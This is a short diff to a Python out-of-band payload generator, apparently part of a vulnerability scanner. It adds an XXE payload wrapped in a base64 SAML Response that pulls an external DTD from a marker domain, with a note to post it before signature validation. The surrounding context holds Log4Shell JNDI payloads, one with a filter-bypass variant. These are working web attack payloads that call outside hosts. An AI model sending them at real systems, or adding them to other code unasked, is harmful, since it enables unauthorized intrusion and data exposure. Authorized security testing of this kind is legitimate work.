@@ -32,7 +32,7 @@ import sys
 import uuid
 from dataclasses import dataclass
 
-VULN_CLASSES = ["ssrf", "xxe", "sqli", "rce", "log4shell"]
+VULN_CLASSES = ["ssrf", "xxe", "sqli", "rce", "log4shell", "saml"]
 
 
 def _uid() -> str:
@@ -99,6 +99,20 @@ def oob_payloads(domain: str, classes: list[str] | None = None) -> dict[str, lis
             {"marker": m, "payload": f"${{jndi:dns://{m}/a}}"},
             {"marker": m, "payload": f"${{${{lower:j}}ndi:ldap://{m}/a}}"},  # filter bypass
         ]
+    if "saml" in classes:
+        m = f"saml-{_uid()}.{domain}"
+        xml = (
+            '<?xml version="1.0" encoding="UTF-8"?>'
+            f'<!DOCTYPE saml [<!ENTITY % p SYSTEM "http://{m}/evil.dtd"> %p;]>'
+            '<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"><!--x--></samlp:Response>'
+        )
+        import base64 as _b64
+        out["saml"] = [{
+            "marker": m,
+            "payload": _b64.b64encode(xml.encode()).decode(),
+            "content_type": "application/x-www-form-urlencoded",
+            "note": "post as SAMLResponse=<base64> before signature validation",
+        }]
     return out
 
 
